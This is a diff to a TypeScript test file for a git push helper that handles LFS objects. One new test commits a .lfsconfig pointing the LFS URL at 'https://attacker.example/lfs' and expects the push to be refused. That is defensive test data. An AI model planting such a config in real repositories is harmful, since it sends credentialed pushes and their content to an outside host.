@@ -1,5 +1,5 @@
 import { afterEach, beforeEach, describe, expect, test } from "bun:test";
-import { chmodSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, renameSync, rmSync, writeFileSync } from "node:fs";
+import { chmodSync, existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, renameSync, rmSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { dirname, join } from "node:path";
 import { runCmd } from "../src/exec.ts";
@@ -655,38 +655,58 @@ describe("gitConfigSnapshot: benign git-lfs and push config (2026-10-10)", () =>
 });
 
 describe("vettedPush: a branch's LFS objects reach origin though hooks are off (seelite #1037)", () => {
- const hasLfs = Bun.which("git-lfs") !== null;
+ const credential = gitCredential("acme/widgets", "placeholder");
  const lfsObject = (bare: string, oid: string) => join(bare, "lfs", "objects", oid.slice(0, 2), oid.slice(2, 4), oid);
+ const branchRef = (origin: string, branch: string) => git(["for-each-ref", "--format=%(refname)", `refs/heads/${branch}`], origin);
 
- test.skipIf(!hasLfs)("an LFS file committed on a node branch has its object on origin after the push", async () => {
-  const origin = await git(["remote", "get-url", "origin"]);
-  await config("filter.lfs.clean", "git-lfs clean -- %f");
-  await config("filter.lfs.smudge", "git-lfs smudge -- %f");
-  await config("filter.lfs.process", "git-lfs filter-process");
-  await config("filter.lfs.required", "true");
-  const credential = gitCredential("acme/widgets", "placeholder");
-  const worktree = await bootstrapWorktree(canonical, "87", "x", credential);
-  writeFileSync(join(worktree, ".gitattributes"), "*.bin filter=lfs diff=lfs merge=lfs -text\n");
-  writeFileSync(join(worktree, "model.bin"), "a study binary\n".repeat(64));
-  await git(["add", ".gitattributes", "model.bin"], worktree);
+ const lfsBranch = async (nodeId: string, extra: Record<string, string> = {}) => {
+  for (const [key, value] of [
+   ["filter.lfs.clean", "git-lfs clean -- %f"],
+   ["filter.lfs.smudge", "git-lfs smudge -- %f"],
+   ["filter.lfs.process", "git-lfs filter-process"],
+   ["filter.lfs.required", "true"],
+  ]) await config(key, value);
+  const worktree = await bootstrapWorktree(canonical, nodeId, "x", credential);
+  const files = { ".gitattributes": "*.bin filter=lfs diff=lfs merge=lfs -text\n", "model.bin": "a study binary\n".repeat(64), ...extra };
+  for (const [name, text] of Object.entries(files)) writeFileSync(join(worktree, name), text);
+  await git(["add", ...Object.keys(files)], worktree);
   await git(["commit", "-m", "add a study binary"], worktree);
   const pointer = await git(["cat-file", "-p", "HEAD:model.bin"], worktree);
-  const oid = /^oid sha256:([0-9a-f]{64})$/m.exec(pointer)?.[1] ?? "";
+  return { worktree, origin: await git(["remote", "get-url", "origin"]), oid: /^oid sha256:([0-9a-f]{64})$/m.exec(pointer)?.[1] ?? "" };
+ };
+
+ test("an LFS file committed on a node branch has its object on origin after the push", async () => {
+  const { worktree, origin, oid } = await lfsBranch("87");
   expect(oid).toHaveLength(64);
-
   await vettedPush({ worktree, canonical, branch: "node/87-x", credential, configSnapshot: gitConfigSnapshot(canonical) });
-
-  expect(await git(["for-each-ref", "--format=%(refname)", "refs/heads/node/87-x"], origin)).toBe("refs/heads/node/87-x");
+  expect(await branchRef(origin, "node/87-x")).toBe("refs/heads/node/87-x");
   expect(readFileSync(lfsObject(origin, oid), "utf8")).toBe("a study binary\n".repeat(64));
+ });
+
+ test("a committed .lfsconfig refuses the push: it can point the credentialed LFS push at another host", async () => {
+  const { worktree, origin, oid } = await lfsBranch("89", { ".lfsconfig": "[lfs]\n\turl = https://attacker.example/lfs\n" });
+  await expect(
+   vettedPush({ worktree, canonical, branch: "node/89-x", credential, configSnapshot: gitConfigSnapshot(canonical) }),
+  ).rejects.toThrow(/\.lfsconfig/);
+  expect(await branchRef(origin, "node/89-x")).toBe("");
+  expect(existsSync(lfsObject(origin, oid))).toBe(false);
  });
 
  test("a branch with no LFS rule pushes without calling git-lfs", async () => {
   const origin = await git(["remote", "get-url", "origin"]);
-  const credential = gitCredential("acme/widgets", "placeholder");
   const worktree = await bootstrapWorktree(canonical, "88", "x", credential);
-  await vettedPush({ worktree, canonical, branch: "node/88-x", credential, configSnapshot: gitConfigSnapshot(canonical) });
-  expect(await git(["for-each-ref", "--format=%(refname)", "refs/heads/node/88-x"], origin)).toBe("refs/heads/node/88-x");
-  expect(readdirSync(origin)).not.toContain("lfs");
+  const failingLfs = join(dir, "failing-lfs");
+  mkdirSync(failingLfs);
+  writeFileSync(join(failingLfs, "git-lfs"), "#!/bin/sh\nexit 97\n");
+  chmodSync(join(failingLfs, "git-lfs"), 0o755);
+  const path = process.env.PATH;
+  process.env.PATH = `${failingLfs}:${path}`;
+  try {
+   await vettedPush({ worktree, canonical, branch: "node/88-x", credential, configSnapshot: gitConfigSnapshot(canonical) });
+  } finally {
+   process.env.PATH = path;
+  }
+  expect(await branchRef(origin, "node/88-x")).toBe("refs/heads/node/88-x");
  });
 
  test("a credentialed lfs push names its remote and ref, as a push does", () => {
